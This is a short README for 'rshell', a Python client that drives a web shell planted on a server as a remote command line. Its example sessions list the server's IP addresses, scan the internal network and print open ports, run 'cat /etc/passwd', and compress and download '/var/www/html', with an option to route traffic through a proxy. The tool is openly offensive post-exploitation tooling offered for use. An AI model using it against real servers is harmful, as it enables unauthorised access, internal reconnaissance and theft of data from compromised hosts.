
# rshell
## Remote command line interpreter via web shell

###Usage:
	python rshell.py -u shell_url [-p proxy:port]
####Examples:
	* python rshell.py -u http://127.0.0.1/shell.php

		#Get the ips assigned to the server interfaces
		rshell:~ get_local_ips
		{'127.0.0.1': {'mask_bits': 8}, '192.168.1.8': {'mask_bits': 24}}

		#Find hosts in the server internal network
		rshell:~ find_hosts

		IP: 192.168.1.3
		Host name: 
 
		IP: 192.168.1.2
		Host name: 
		 
		IP: 192.168.1.1
		Host name: 
		23/tcp    open  telnet
		53/tcp    open  domain
		80/tcp    open  http
		52869/tcp open  unknown
		 
		IP: 192.168.1.8
		Host name: 
		22/tcp  open  ssh
		80/tcp  open  http
		111/tcp open  rpcbind
		139/tcp open  netbios-ssn
		445/tcp open  microsoft-ds

		#Run a command on the server side
		rshell:~ cat /etc/passwd

		#Run a command on the client side
		rshell:~ !command_in_client_side

		#Compress and download a folder
		rshell:~ dwfolder /var/www/html

	* python rshell.py -u http://127.0.0.1/shell.php -p proxy:port
